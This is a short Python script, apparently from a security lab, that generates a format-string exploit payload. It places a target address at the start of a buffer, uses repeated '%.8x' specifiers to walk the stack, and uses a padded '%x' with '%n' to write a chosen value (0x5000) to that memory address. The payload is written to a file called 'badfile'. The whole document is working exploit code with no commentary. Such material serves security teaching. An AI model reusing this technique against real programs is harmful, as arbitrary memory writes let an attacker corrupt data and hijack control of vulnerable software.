#! /usr/bin/python3
import sys

def task_b(address, N, target_value):
    global content

    content[0:4] = (address).to_bytes(4, byteorder='little')

    printed = 4 + 8*(N-2)

    count = target_value - printed
    pattern = '{Prefix}%.{C}x%n\n'
    s = pattern.format(Prefix = "%.8x"*(N-2), C=count)
    print(s)

    fmt = (s).encode('latin-1')
    content[4:4+len(fmt)] = fmt


N = 1500
content = bytearray(0x0 for i in range(N))

address = 0x080e5068

task_b(address, int(sys.argv[1]), 0x5000)

with open('badfile', 'wb') as f:
    f.write(content)
